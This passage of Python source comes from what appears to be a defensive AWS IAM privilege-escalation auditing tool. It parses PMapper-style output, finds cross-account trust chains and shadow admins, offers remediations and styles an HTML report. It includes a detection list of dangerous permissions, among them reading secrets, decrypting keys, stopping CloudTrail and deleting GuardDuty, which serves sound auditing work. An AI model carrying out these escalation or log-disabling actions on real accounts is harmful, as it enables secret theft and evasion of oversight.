    "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
        "StringEquals": {
            "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
            "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
        }
    }
}''',
        },
    }

    @classmethod
    def get_remediation(cls, finding_type: str) -> Dict[str, str]:
        """Get remediation details for a finding type."""
        return cls.REMEDIATIONS.get(finding_type, {
            "issue": "Security misconfiguration detected",
            "fix": "Review and apply least-privilege principles",
            "example": "Consult AWS IAM best practices documentation",
        })

    @classmethod
    def get_path_remediation(cls, path: EscalationPath) -> Dict[str, str]:
        """Get specific remediation for an escalation path."""
        technique = path.technique

        if "AssumeRole" in technique:
            return cls.REMEDIATIONS["sts:AssumeRole"]
        elif "Lambda" in technique:
            return cls.REMEDIATIONS["lambda_abuse"]
        elif "EC2" in technique or "Instance Profile" in technique:
            return cls.REMEDIATIONS["ec2_instance_profile"]
        elif "Policy" in technique:
            return cls.REMEDIATIONS["iam:PassRole"]
        else:
            return {
                "issue": f"Privilege escalation via {technique}",
                "fix": "Review the escalation path and restrict the enabling permissions",
                "example": "Analyze each hop in the path and apply resource restrictions",
            }

    @classmethod
    def get_trust_remediation(cls, trust: CrossAccountTrust) -> Dict[str, str]:
        """Get specific remediation for a cross-account trust issue."""
        if trust.is_wildcard:
            return cls.REMEDIATIONS["cross_account_wildcard"]
        elif not trust.has_external_id:
            return cls.REMEDIATIONS["cross_account_no_external_id"]
        else:
            return {
                "issue": "Cross-account trust relationship",
                "fix": "Verify the trusted account is legitimate and regularly audit access",
                "example": "Use AWS CloudTrail to monitor AssumeRole events",
            }


class CrossAccountAnalyzer:
    """Analyze trust relationships across multiple accounts."""

    def __init__(self, analyses: List[AccountAnalysis]):
        self.analyses = analyses
        self.account_map = {a.account_id: a for a in analyses}

    def analyze(self) -> List[Finding]:
        """Find cross-account escalation paths and trust issues."""
        findings = []

        all_trusts = []
        for analysis in self.analyses:
            all_trusts.extend(analysis.cross_account_trusts)

        trust_chains = self._find_trust_chains()
        if trust_chains:
            findings.append(Finding(
                id="cross_account_chain",
                title="Cross-Account Trust Chains",
                severity="high",
                category="cross_account",
                description=f"Found {len(trust_chains)} trust chains spanning multiple accounts.",
                principals=[],
                impact="Compromise of one account may lead to lateral movement across accounts.",
                remediation="Review and minimize cross-account trust relationships. "
                           "Implement strong external ID requirements. "
                           "Consider using AWS Organizations SCPs to restrict cross-account access.",
                details={"chains": trust_chains},
            ))

        trust_counts = defaultdict(list)
        for trust in all_trusts:
            if trust.trusted_account and trust.trusted_account != "unknown":
                trust_counts[trust.trusted_account].append(trust.role_arn)

        widely_trusted = {acc: roles for acc, roles in trust_counts.items()
                        if len(roles) >= 2}
        if widely_trusted:
            findings.append(Finding(
                id="widely_trusted_accounts",
                title="Accounts with Broad Trust Footprint",
                severity="medium",
                category="cross_account",
                description="These external accounts are trusted by multiple roles across your accounts.",
                principals=list(widely_trusted.keys()),
                impact="If these accounts are compromised, multiple roles become accessible.",
                remediation="Verify each trusted account is legitimate and necessary. "
                           "Consider consolidating trust relationships.",
                details={"trust_map": widely_trusted},
            ))

        return findings

    def _find_trust_chains(self) -> List[Dict]:
        """Find paths where Account A trusts B and B trusts C."""
        chains = []

        trust_graph = defaultdict(set)
        for analysis in self.analyses:
            for trust in analysis.cross_account_trusts:
                if trust.trusted_account and trust.trusted_account != "unknown":
                    trust_graph[trust.trusted_account].add(analysis.account_id)

        for start_account in trust_graph:
            visited = {start_account}
            queue = [(start_account, [start_account])]

            while queue:
                current, path = queue.pop(0)

                for next_account in trust_graph.get(current, []):
                    if next_account in visited:
                        continue

                    new_path = path + [next_account]
                    if len(new_path) >= 3:
                        chains.append({
                            "path": new_path,
                            "description": " -> ".join(new_path),
                        })
                    elif len(new_path) < 5:
                        visited.add(next_account)
                        queue.append((next_account, new_path))

        return chains


class QueryResultsAnalyzer:
    """Analyze pmapper query text output to extract findings."""

    def __init__(self, results: Dict[str, List[str]], stats: Dict[str, str]):
        self.results = results
        self.stats = stats
        self.account_id = stats.get("account_id", "unknown")

    def extract_principal(self, line: str) -> Optional[str]:
        """Extract principal ARN or name from a query result line."""
        m = re.match(r"^((user|role|group)/[\w\-\.@+=]+)", line.strip())
        if m:
            return m.group(1)

        arn_match = re.search(r"(arn:aws:iam::\d+:(user|role|group)/[\w\-\.@+=]+)", line)
        if arn_match:
            return arn_match.group(1)

        parts = line.split()
        if parts:
            return parts[0].strip()

        return None

    def get_principals_for_check(self, check_key: str) -> Set[str]:
        """Get all principals that can perform a specific action."""
        principals = set()
        for line in self.results.get(check_key, []):
            p = self.extract_principal(line)
            if p and "amazonaws.com" not in p:
                principals.add(p)
        return principals

    def get_privesc_paths(self) -> List[Dict]:
        """Parse privilege escalation paths from preset results."""
        paths = []
        current_path = None

        raw_lines = []
        for key in ["privesc_all", "privesc_skip"]:
            raw_lines.extend(self.results.get(key, []))

        seen = set()
        for line in raw_lines:
            if line in seen:
                continue
            seen.add(line)

            if "is an administrative principal" in line:
                if current_path:
                    paths.append(current_path)
                    current_path = None
                continue

            elif "can escalate privileges by accessing" in line:
                if current_path:
                    paths.append(current_path)

                source = self.extract_principal(line)
                target_match = re.search(r"accessing the administrative principal (\S+?)[:$\s]", line)
                target = target_match.group(1).rstrip(":") if target_match else ""

                hops = []
                if ": " in line:
                    inline = line.split(": ", 1)[1].strip()
                    if inline:
                        hops.append(inline)

                current_path = {
                    "source": source,
                    "target": target,
                    "hops": hops,
                    "raw_line": line,
                }
            else:
                if current_path and line.strip():
                    current_path["hops"].append(line.strip())

        if current_path:
            paths.append(current_path)

        return paths

    def get_shadow_admins(self) -> List[str]:
        """Get shadow admins from wrongadmin preset."""
        return list(self.get_principals_for_check("wrongadmin"))

    def get_admins(self) -> Set[str]:
        """Extract admin principals from privesc output."""
        admins = set()
        for line in self.results.get("privesc_all", []):
            if "is an administrative principal" in line:
                p = self.extract_principal(line)
                if p:
                    admins.add(p)
        return admins

    def build_principal_capabilities(self) -> Dict[str, Set[str]]:
        """Build a map of principal -> set of dangerous actions they can perform."""
        capabilities = defaultdict(set)

        query_to_action = {
            "iam_create_user": "iam:CreateUser",
            "iam_create_access_key": "iam:CreateAccessKey",
            "iam_create_login_profile": "iam:CreateLoginProfile",
            "iam_attach_user_policy": "iam:AttachUserPolicy",
            "iam_attach_role_policy": "iam:AttachRolePolicy",
            "iam_attach_group_policy": "iam:AttachGroupPolicy",
            "iam_put_user_policy": "iam:PutUserPolicy",
            "iam_put_role_policy": "iam:PutRolePolicy",
            "iam_put_group_policy": "iam:PutGroupPolicy",
            "iam_set_default_policy_version": "iam:SetDefaultPolicyVersion",
            "iam_create_policy_version": "iam:CreatePolicyVersion",
            "iam_passrole": "iam:PassRole",
            "iam_add_user_to_group": "iam:AddUserToGroup",
            "iam_update_assume_role_policy": "iam:UpdateAssumeRolePolicy",
            "sts_assumerole": "sts:AssumeRole",
            "secretsmanager_get": "secretsmanager:GetSecretValue",
            "ssm_get_parameter": "ssm:GetParameter",
            "ssm_get_parameters": "ssm:GetParameters",
            "ssm_get_parameters_by_path": "ssm:GetParametersByPath",
            "s3_get_object": "s3:GetObject",
            "s3_put_object": "s3:PutObject",
            "s3_delete_object": "s3:DeleteObject",
            "s3_put_bucket_policy": "s3:PutBucketPolicy",
            "ec2_run_instances": "ec2:RunInstances",
            "lambda_create_function": "lambda:CreateFunction",
            "lambda_update_code": "lambda:UpdateFunctionCode",
            "lambda_add_permission": "lambda:AddPermission",
            "lambda_invoke": "lambda:InvokeFunction",
            "glue_create_job": "glue:CreateJob",
            "glue_update_job": "glue:UpdateJob",
            "cloudformation_create_stack": "cloudformation:CreateStack",
            "cloudformation_update_stack": "cloudformation:UpdateStack",
            "codebuild_create_project": "codebuild:CreateProject",
            "codebuild_start_build": "codebuild:StartBuild",
            "sagemaker_create_training": "sagemaker:CreateTrainingJob",
            "sagemaker_create_notebook": "sagemaker:CreateNotebookInstance",
            "ecs_run_task": "ecs:RunTask",
            "ecs_register_task_definition": "ecs:RegisterTaskDefinition",
            "states_create_statemachine": "states:CreateStateMachine",
            "datapipeline_create_pipeline": "datapipeline:CreatePipeline",
            "cloudtrail_stop": "cloudtrail:StopLogging",
            "cloudtrail_delete": "cloudtrail:DeleteTrail",
            "guardduty_delete": "guardduty:DeleteDetector",
            "config_stop": "config:StopConfigurationRecorder",
            "kms_decrypt": "kms:Decrypt",
        }

        for query_key, action in query_to_action.items():
            for principal in self.get_principals_for_check(query_key):
                capabilities[principal].add(action)

        return dict(capabilities)


class QueryEngine:
    """PMapper-style query interface for IAM analysis."""

    PRESETS = {
        "privesc": {
            "name": "Privilege Escalation Paths",
            "description": "Find all principals that can escalate to admin",
            "filter": lambda p, qe: not p.is_admin and any(e.target in qe.admins for e in qe.edge_from.get(p.arn, [])),
        },
        "admin": {
            "name": "Administrative Principals",
            "description": "List all principals with administrative access",
            "filter": lambda p, qe: p.is_admin,
        },
        "shadow": {
            "name": "Shadow Administrators",
            "description": "Principals that can become admin without being admin",
            "filter": lambda p, qe: not p.is_admin and any(e.target in qe.admins for e in qe.edge_from.get(p.arn, [])),
        },
        "cross-account": {
            "name": "Cross-Account Access",
            "description": "Principals with cross-account trust relationships",
            "filter": lambda p, qe: QueryEngine._has_cross_account_trust(p),
        },
        "ssm": {
            "name": "SSM Access",
            "description": "Principals that can use SSM for lateral movement",
            "actions": ["ssm:SendCommand", "ssm:StartSession"],
        },
        "secrets": {
            "name": "Secrets Access",
            "description": "Principals that can access secrets",
            "actions": ["secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParameters"],
        },
        "s3": {
            "name": "S3 Data Access",
            "description": "Principals with broad S3 access",
            "actions": ["s3:GetObject", "s3:PutObject", "s3:*"],
        },
        "dangerous": {
            "name": "Dangerous Permissions",
            "description": "Principals with any dangerous IAM actions",
            "actions": list(DANGEROUS_ACTIONS),
        },
    }

    def __init__(self, analysis: 'AccountAnalysis'):
        self.analysis = analysis
        self._build_indexes()

    def _build_indexes(self):
        """Build index of actions to principals and edge lookup."""
        self.action_to_principals = defaultdict(set)
        self.edge_from = defaultdict(list)
        self.admins = set()

        for edge in self.analysis.edges:
            self.edge_from[edge.source].append(edge)

        for principal in self.analysis.principals.values():
            if principal.is_admin:
                self.admins.add(principal.arn)
            for action in principal.dangerous_actions:
                self.action_to_principals[action].add(principal.arn)

    @staticmethod
    def _has_cross_account_trust(principal) -> bool:
        """Check if principal has cross-account trust."""
        if not principal.trust_policy:
            return False
        trust_str = json.dumps(principal.trust_policy)
        if re.search(r'arn:aws:iam::(?!{})'.format(principal.account_id), trust_str):
            return True
        if '"*"' in trust_str:
            return True
        return False

    def query(self, query_str: str) -> List[Dict]:
        """
        Execute a PMapper-style query.
        Supports: 'who can do <action>' and 'who can do <action> with <resource>'
        """
        results = []

        query_lower = query_str.lower().strip()

        match = re.match(r"who can do ([a-z0-9:*]+)(?:\s+with\s+(.+))?", query_lower)
        if match:
            action = match.group(1)
            resource = match.group(2) if match.group(2) else "*"
            results = self._query_action(action, resource)
        else:
            if ":" in query_str:
                results = self._query_action(query_str, "*")

        return results

    def _query_action(self, action: str, resource: str = "*") -> List[Dict]:
        """Find all principals that can perform an action."""
        results = []
        action_lower = action.lower()

        for principal in self.analysis.principals.values():
            can_do = False
            matched_via = None
            actions = principal.dangerous_actions

            if principal.is_admin:
                can_do = True
                matched_via = "admin (*)"
            elif action_lower in [a.lower() for a in actions]:
                can_do = True
                matched_via = "direct"

            elif "*" in actions or "iam:*" in actions:
                can_do = True
                matched_via = "wildcard (*)"

            else:
                service = action_lower.split(":")[0] if ":" in action_lower else ""
                service_wildcard = f"{service}:*"
                if service_wildcard.lower() in [a.lower() for a in actions]:
                    can_do = True
                    matched_via = f"service wildcard ({service_wildcard})"

            if not can_do:
                for edge in self.edge_from.get(principal.arn, []):
                    target = self.analysis.principals.get(edge.target)
                    if target:
                        target_actions = target.dangerous_actions
                        if action_lower in [a.lower() for a in target_actions] or "*" in target_actions:
                            can_do = True
                            matched_via = f"indirect via {edge.target.split('/')[-1]}"
                            break

            if can_do:
                results.append({
                    "principal": principal.arn,
                    "name": principal.name,
                    "type": principal.principal_type,
                    "is_admin": principal.is_admin,
                    "matched_via": matched_via,
                    "direct": matched_via == "direct",
                })

        return sorted(results, key=lambda x: (not x["direct"], x["name"]))

    def run_preset(self, preset_name: str) -> List[Dict]:
        """Run a preset query."""
        preset = self.PRESETS.get(preset_name)
        if not preset:
            return []

        results = []

        if "actions" in preset:
            seen = set()
            for action in preset["actions"]:
                for result in self._query_action(action, "*"):
                    if result["principal"] not in seen:
                        seen.add(result["principal"])
                        result["matched_action"] = action
                        results.append(result)

        elif "filter" in preset:
            filter_fn = preset["filter"]
            for principal in self.analysis.principals.values():
                try:
                    if filter_fn(principal, self):
                        results.append({
                            "principal": principal.arn,
                            "name": principal.name,
                            "type": principal.principal_type,
                            "is_admin": principal.is_admin,
                        })
                except Exception:
                    pass

        return results

    def print_results(self, results: List[Dict], title: str = "Query Results"):
        """Print query results in PMapper style."""
        print(f"\n{'='*60}")
        print(f"  {title}")
        print(f"  Found: {len(results)} principal(s)")
        print(f"{'='*60}\n")

        if not results:
            print("  No matching principals found.\n")
            return

        by_type = defaultdict(list)
        for r in results:
            by_type[r.get("type", "unknown")].append(r)

        for ptype, principals in sorted(by_type.items()):
            print(f"  [{ptype.upper()}S] ({len(principals)})")
            for p in principals:
                admin_tag = " [ADMIN]" if p.get("is_admin") else ""
                via = f" (via {p.get('matched_via')})" if p.get("matched_via") else ""
                action = f" [{p.get('matched_action')}]" if p.get("matched_action") else ""
                print(f"    - {p['name']}{admin_tag}{via}{action}")
            print()


CSS = """
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
:root{
  /* Black & Olive Green Theme - Gen Z Edition */
  --bg:#0a0a0a;--bg2:#111111;--bg3:#181818;--bg4:#222222;
  --bd:#2a2a2a;--bd2:#3a3a3a;--bd3:#444;
  --tx:#d4d4d4;--tx2:#8a8a8a;--txb:#f5f5f5;
  --primary:#84a98c;--primary-light:#1a2e1a;--primary-dark:#52796f;
  --cr:#ff6b6b;--cr2:#2a1515;--cr3:#4a1c1c;
  --hi:#fbbf24;--hi2:#2a2010;--hi3:#463d1a;
  --md:#60a5fa;--md2:#172554;--md3:#1e3a5f;
  --ok:#84a98c;--ok2:#1a2e1a;--ok3:#2d4a32;
  --ac:#84a98c;--ac2:#1a2e1a;--ac3:#2d4a32;
  --purple:#a78bfa;--purple2:#1e1a2e;--purple3:#3b2f5a;
  --sidebar:#0a0a0a;--sidebar-text:#8a8a8a;
  --olive:#84a98c;--olive-dark:#52796f;--olive-light:#cad2c5;--olive-bright:#a4c3ac;
  --mono:'JetBrains Mono',monospace;--body:'Inter',sans-serif;
  --shadow-sm:0 1px 2px rgba(0,0,0,0.3);
  --shadow:0 2px 8px rgba(0,0,0,0.4),0 1px 3px rgba(0,0,0,0.3);
  --shadow-lg:0 8px 24px rgba(0,0,0,0.5),0 4px 8px rgba(0,0,0,0.3);
  --shadow-glow:0 0 20px rgba(132,169,140,0.15);
  --radius:12px;--radius-sm:8px;--radius-lg:16px;--radius-xl:24px;
  /* Syntax highlighting */
  --syn-keyword:#ff79c6;--syn-string:#f1fa8c;--syn-comment:#6272a4;--syn-func:#50fa7b;--syn-var:#bd93f9;--syn-num:#ffb86c;
}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:var(--body);background:var(--bg);color:var(--tx);font-size:14px;line-height:1.7;display:flex;min-height:100vh}
code{font-family:var(--mono);font-size:11px;background:var(--bg3);padding:3px 8px;border-radius:var(--radius-sm);color:var(--olive-bright);border:1px solid var(--bd)}
pre{font-family:var(--mono);font-size:12px;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);color:#e2e8f0;padding:20px;border-radius:var(--radius);overflow-x:auto;white-space:pre-wrap;margin:12px 0;border:1px solid #2a3a5a;position:relative}
pre::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--olive),var(--olive-dark));border-radius:var(--radius) var(--radius) 0 0}
p{margin-bottom:10px}
strong{color:var(--txb);font-weight:600}
h1,h2,h3,h4{color:var(--txb);font-weight:700;letter-spacing:-0.02em}

@keyframes fade-in{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
@keyframes slide-up{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
@keyframes glow{0%,100%{box-shadow:0 0 5px rgba(132,169,140,0.2)}50%{box-shadow:0 0 20px rgba(132,169,140,0.4)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.7}}

/* Sidebar - Dark Olive Theme */
.sidebar{width:240px;background:#0d0d0d;color:var(--sidebar-text);flex-shrink:0;position:fixed;height:100vh;overflow-y:auto;z-index:100;border-right:1px solid var(--bd)}
.sidebar::-webkit-scrollbar{width:4px}
.sidebar::-webkit-scrollbar-thumb{background:var(--olive-dark);border-radius:2px}
.sidebar-header{padding:20px;border-bottom:1px solid var(--bd)}
.sidebar-logo{font-size:15px;font-weight:600;color:var(--olive-light);display:flex;align-items:center;gap:10px}
.sidebar-logo-icon{width:32px;height:32px;background:var(--olive-dark);border-radius:var(--radius);display:flex;align-items:center;justify-content:center;font-size:16px}
.sidebar-version{font-size:10px;color:var(--tx2);margin-top:4px;font-family:var(--mono)}
.sidebar-nav{padding:12px 0}
.sidebar-section{padding:16px 16px 8px;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--olive-dark);font-weight:500}
.sidebar-link{display:flex;align-items:center;gap:10px;padding:10px 16px;color:var(--sidebar-text);text-decoration:none;font-size:13px;transition:all 0.15s;cursor:pointer;margin:2px 8px;border-radius:var(--radius)}
.sidebar-link:hover{background:var(--bg3);color:var(--olive-light)}
.sidebar-link.active{background:var(--olive-dark);color:#fff}
.sidebar-link-icon{width:18px;text-align:center;font-size:14px}
.sidebar-link-badge{margin-left:auto;font-size:10px;padding:2px 6px;background:var(--cr);color:#fff;border-radius:4px;font-family:var(--mono);font-weight:600}
.sidebar-stats{padding:16px;border-top:1px solid var(--bd);margin-top:auto}
.sidebar-stat{display:flex;justify-content:space-between;padding:6px 0;font-size:12px}
.sidebar-stat-label{color:var(--tx2)}
.sidebar-stat-value{color:var(--olive);font-family:var(--mono);font-weight:500}

.main-wrapper{flex:1;margin-left:240px;display:flex;flex-direction:column;min-height:100vh;background:linear-gradient(180deg,var(--bg) 0%,#0d100d 100%)}

/* Header - Modern Glass Effect */
.header{background:rgba(17,17,17,0.8);backdrop-filter:blur(12px);padding:20px 32px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--bd);position:sticky;top:0;z-index:50}
.header-inner{flex:1}
.header-label{font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:var(--olive);margin-bottom:4px;font-weight:600}
.header-title{font-size:22px;font-weight:800;color:var(--txb);letter-spacing:-0.03em}
.header-meta{font-size:12px;color:var(--tx2);margin-top:4px;font-family:var(--mono)}
.header-actions{display:flex;gap:10px}
.header-btn{font-size:12px;padding:10px 18px;background:var(--bg3);border:1px solid var(--bd);color:var(--tx);border-radius:var(--radius);cursor:pointer;transition:all 0.2s ease;font-weight:500}
.header-btn:hover{border-color:var(--olive);color:var(--olive);transform:translateY(-1px);box-shadow:var(--shadow)}
.header-badge{font-family:var(--mono);font-size:10px;padding:8px 14px;background:linear-gradient(135deg,var(--primary-light),var(--ok2));color:var(--olive-bright);border-radius:var(--radius);font-weight:600;border:1px solid var(--olive-dark)}

/* Main Content - Breathing Room */
.main{flex:1;padding:32px;overflow-y:auto;max-width:1500px;width:100%;box-sizing:border-box}
.content-section{display:none;animation:fade-in 0.3s ease}
.content-section.active{display:block}

/* Summary Cards - Modern Glass Cards */
.summary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:32px}
.summary-card{background:linear-gradient(145deg,var(--bg2),var(--bg3));border:1px solid var(--bd);border-radius:var(--radius-lg);padding:24px 20px;text-align:center;transition:all 0.25s ease;position:relative;overflow:hidden}
.summary-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--olive-dark),transparent);opacity:0;transition:opacity 0.3s}
.summary-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg),var(--shadow-glow);border-color:var(--olive-dark)}
.summary-card:hover::before{opacity:1}
.summary-value{font-size:36px;font-weight:800;color:var(--olive-bright);font-family:var(--mono);letter-spacing:-0.02em}
.summary-value.critical{color:var(--cr);text-shadow:0 0 20px rgba(255,107,107,0.3)}
.summary-value.high{color:var(--hi);text-shadow:0 0 20px rgba(251,191,36,0.3)}
.summary-label{font-size:11px;color:var(--tx2);margin-top:8px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px}

/* Findings Grid - Modern Card Layout */
.findings-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(100%,380px),1fr));gap:20px}
.finding-card{background:linear-gradient(145deg,var(--bg2),var(--bg3));border:1px solid var(--bd);border-radius:var(--radius-lg);overflow:hidden;transition:all 0.25s ease}
.finding-card:hover{box-shadow:var(--shadow-lg);border-color:var(--olive-dark);transform:translateY(-2px)}
.finding-card-header{padding:24px;display:flex;align-items:flex-start;justify-content:space-between;gap:16px}
.finding-card-title{font-size:15px;font-weight:700;color:var(--txb);line-height:1.5;flex:1}
.finding-card-body{padding:0 24px 24px}
.finding-card-desc{font-size:13px;color:var(--tx2);line-height:1.7;margin-bottom:16px}
.finding-card-meta{display:flex;flex-wrap:wrap;gap:10px}
.finding-card-tag{font-family:var(--mono);font-size:9px;padding:5px 12px;background:var(--bg4);border-radius:var(--radius-sm);color:var(--tx2);border:1px solid var(--bd)}
.finding-card-footer{padding:18px 24px;background:var(--bg4);border-top:1px solid var(--bd);display:flex;justify-content:space-between;align-items:center}
.finding-card-action{font-family:var(--mono);font-size:11px;color:var(--olive);cursor:pointer;font-weight:600;display:flex;align-items:center;gap:8px;transition:all 0.2s}
.finding-card-action:hover{color:var(--olive-bright);transform:translateX(3px)}

/* Finding Detail - Expandable Cards */
.finding{background:linear-gradient(145deg,var(--bg2),var(--bg3));border:1px solid var(--bd);border-radius:var(--radius-lg);margin-bottom:20px;overflow:hidden;transition:all 0.25s ease}
.finding:hover{border-color:var(--bd2)}
.finding-header{display:flex;justify-content:space-between;align-items:center;padding:20px 24px;cursor:pointer;transition:all 0.2s}
.finding-header:hover{background:rgba(132,169,140,0.05)}
.finding-header-left{display:flex;align-items:center;gap:16px}
.finding-chevron{font-size:12px;color:var(--tx2);transition:all 0.25s ease;width:20px;text-align:center}
.finding-chevron.open{transform:rotate(90deg);color:var(--olive)}
.finding-title{font-size:15px;font-weight:700;color:var(--txb)}
.finding-body{display:none;padding:24px;background:linear-gradient(180deg,var(--bg2),var(--bg));border-top:1px solid var(--bd)}
.finding-body.open{display:block;animation:fade-in 0.3s ease}
.finding-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:20px;margin-bottom:20px}
.finding-grid:last-child{margin-bottom:0}
@media(max-width:1200px){.finding-grid{grid-template-columns:1fr}.findings-grid{grid-template-columns:1fr}.query-grid{grid-template-columns:repeat(auto-fill,minmax(250px,1fr))}.overperm-grid{grid-template-columns:repeat(auto-fill,minmax(180px,1fr))}.run-info-grid{grid-template-columns:1fr}}
@media(max-width:900px){.sidebar{display:none}.main-wrapper{margin-left:0}.header{padding:16px 20px}.main{padding:20px}.summary-grid{grid-template-columns:repeat(2,1fr)}.principal-controls{flex-direction:column;align-items:stretch}.filter-group{justify-content:center}.export-group{justify-content:center}.site-footer{left:0!important}.graph-canvas{height:400px!important}}
@media(max-width:600px){.summary-grid{grid-template-columns:1fr}.header-title{font-size:18px}.finding-section h4{font-size:9px}.badge{font-size:8px;padding:3px 8px}.site-footer{flex-direction:column;gap:8px;text-align:center}.escalation-table{font-size:11px}.escalation-table th,.escalation-table td{padding:8px 6px}}

/* Tables - Responsive */
.table-wrapper{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:0 -4px;padding:0 4px}
.escalation-table{width:100%;min-width:600px}
.finding-section{background:var(--bg3);border-radius:var(--radius);padding:20px;border:1px solid var(--bd);transition:all 0.2s ease}
.finding-section:hover{border-color:var(--olive-dark);box-shadow:inset 0 0 0 1px rgba(132,169,140,0.1)}
.finding-section h4{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--olive);margin-bottom:14px;font-family:var(--mono);display:flex;align-items:center;gap:10px}
.finding-section h4::before{content:"";width:4px;height:14px;background:linear-gradient(180deg,var(--olive),var(--olive-dark));border-radius:2px}
.finding-section p{font-size:13px;line-height:1.7;color:var(--tx)}

/* Badges - Modern Pill Style */
.badge{font-family:var(--mono);font-size:9px;font-weight:700;padding:5px 12px;border-radius:20px;text-transform:uppercase;letter-spacing:0.8px;border:1px solid currentColor;transition:all 0.2s}
.badge.critical{background:linear-gradient(135deg,var(--cr2),#3a1a1a);color:#ff6b6b;border-color:#ff6b6b;box-shadow:0 0 10px rgba(255,107,107,0.2)}
.badge.high{background:linear-gradient(135deg,var(--hi2),#3a3010);color:#fbbf24;border-color:#fbbf24;box-shadow:0 0 10px rgba(251,191,36,0.2)}
.badge.medium{background:linear-gradient(135deg,var(--md2),#1a2a4a);color:#60a5fa;border-color:#60a5fa}
.badge.low{background:linear-gradient(135deg,var(--ok2),#1a3a2a);color:var(--olive-bright);border-color:var(--olive)}

/* Principal Tags - Clickable Pills */
.principal-list{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px}
.principal-tag{font-family:var(--mono);font-size:10px;padding:6px 12px;background:var(--bg4);border-radius:var(--radius-sm);color:var(--tx);transition:all 0.2s ease;cursor:pointer;border:1px solid var(--bd)}
.principal-tag:hover{background:var(--olive-dark);color:#fff;border-color:var(--olive);transform:translateY(-1px);box-shadow:var(--shadow-sm)}
.principal-tag.critical{background:linear-gradient(135deg,var(--cr2),#3a1a1a);color:var(--cr);border-color:var(--cr3)}
.principal-tag.admin{background:linear-gradient(135deg,var(--cr2),#3a1a1a);color:var(--cr);border-color:var(--cr3)}

/* Affected Principals - Compact Card Grid */
.affected-principals{display:flex;flex-direction:column;gap:8px}
.affected-principals-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.affected-principals-actions{display:flex;gap:6px}
.principal-card{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:var(--bg4);border:1px solid var(--bd);border-radius:var(--radius-sm);transition:all 0.15s;gap:12px}
.principal-card:hover{border-color:var(--olive-dark);background:var(--bg3)}
.principal-card-left{display:flex;align-items:center;gap:10px;flex:1;min-width:0}
.principal-card-icon{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0}
.principal-card-icon.user{background:linear-gradient(135deg,var(--olive-dark),#2a4a3a);color:var(--olive-bright)}
.principal-card-icon.role{background:linear-gradient(135deg,#2a3a5a,#1a2a4a);color:#60a5fa}
.principal-card-info{flex:1;min-width:0}
.principal-card-name{font-family:var(--mono);font-size:12px;font-weight:600;color:var(--txb);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.principal-card-arn{font-family:var(--mono);font-size:9px;color:var(--tx2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
.principal-card-badges{display:flex;gap:4px;flex-shrink:0}
.principal-card-actions{display:flex;gap:4px;flex-shrink:0}
.copy-arn-btn{font-family:var(--mono);font-size:9px;padding:4px 8px;background:transparent;border:1px solid var(--bd);color:var(--tx2);border-radius:4px;cursor:pointer;transition:all 0.15s}
.copy-arn-btn:hover{background:var(--olive-dark);border-color:var(--olive);color:#fff}
.copy-arn-btn.copied{background:var(--olive);border-color:var(--olive);color:#000}
.show-more-btn{font-family:var(--mono);font-size:11px;padding:10px 16px;background:var(--bg3);border:1px dashed var(--bd);color:var(--tx2);border-radius:var(--radius-sm);cursor:pointer;transition:all 0.15s;width:100%;text-align:center;margin-top:8px}
.show-more-btn:hover{background:var(--olive-dark);border-color:var(--olive);border-style:solid;color:#fff}
.principals-hidden{display:none!important}
.principals-hidden.show{display:flex!important}
.overperm-chip.principals-hidden.show{display:flex!important}

/* Overly Permissive - Compact Chip View */
.overperm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px}
.overperm-chip{display:flex;align-items:center;gap:8px;padding:10px 12px;background:var(--bg4);border:1px solid var(--bd);border-radius:var(--radius-sm);transition:all 0.15s;cursor:pointer}
.overperm-chip:hover{border-color:var(--olive-dark);background:var(--bg3)}
.overperm-chip-icon{width:24px;height:24px;border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:10px;flex-shrink:0;background:linear-gradient(135deg,var(--hi2),#3a3010);color:#fbbf24}
.overperm-chip-info{flex:1;min-width:0}
.overperm-chip-name{font-family:var(--mono);font-size:11px;font-weight:600;color:var(--txb);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.overperm-chip-type{font-size:9px;color:var(--tx2);text-transform:uppercase;letter-spacing:0.5px}
.overperm-collapse{margin-top:16px}
.overperm-toggle{font-family:var(--mono);font-size:10px;padding:8px 14px;background:var(--bg3);border:1px solid var(--bd);color:var(--tx2);border-radius:var(--radius-sm);cursor:pointer;transition:all 0.15s}
.overperm-toggle:hover{background:var(--olive-dark);border-color:var(--olive);color:#fff}

/* Path Blocks - Attack Chain Visualization */
